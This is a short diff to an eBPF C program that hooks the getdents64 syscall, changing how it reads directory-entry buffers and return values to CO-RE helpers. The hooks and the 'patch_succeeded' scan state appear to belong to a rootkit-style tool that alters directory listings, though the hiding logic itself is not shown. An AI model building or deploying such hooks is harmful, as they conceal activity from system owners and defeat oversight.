@@ -41,11 +41,11 @@ struct {
 
 
 static __always_inline int read_dirent_name(__u8 *dst, const char *raw_data) {
-   return bpf_probe_read_user_str(dst, MAX_NAME_LEN, raw_data);
+   return bpf_core_read_user_str(dst, MAX_NAME_LEN, raw_data);
 }
 
 static __always_inline int read_dirent_reclen(u16 *dst, const unsigned short *raw_data) {
-   return bpf_probe_read(dst, sizeof(*dst), raw_data);
+   return bpf_core_read_user(dst, sizeof(*dst), raw_data);
 }
 
 static __always_inline struct linux_dirent64 *get_dirent_ptr(u64 dirents_buf, int bpos) {
@@ -119,7 +119,8 @@ SEC("tp/syscalls/sys_enter_getdents64")
 int hook_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
 {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
-   u64 dirents_buf = ctx->args[1];
+   u64 dirents_buf = 0;
+   bpf_core_read(&dirents_buf, sizeof(dirents_buf), &ctx->args[1]);
    bpf_map_update_elem(&dirent_buf_map, &pid, &dirents_buf, BPF_ANY);
    return 0;
 }
@@ -132,10 +133,12 @@ int hook_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
    if (!dirents_buf) {
       return 0;
    }
+   long ret = 0;
+   bpf_core_read(&ret, sizeof(ret), &ctx->ret);
    dirent_scan_t scan = {
       .bpos = 0,
       .dirents_buf = dirents_buf,
-      .buf_size = ctx->ret,
+      .buf_size = ret,
       .reclen = 0,
       .reclen_prev = 0,
       .patch_succeeded = false,
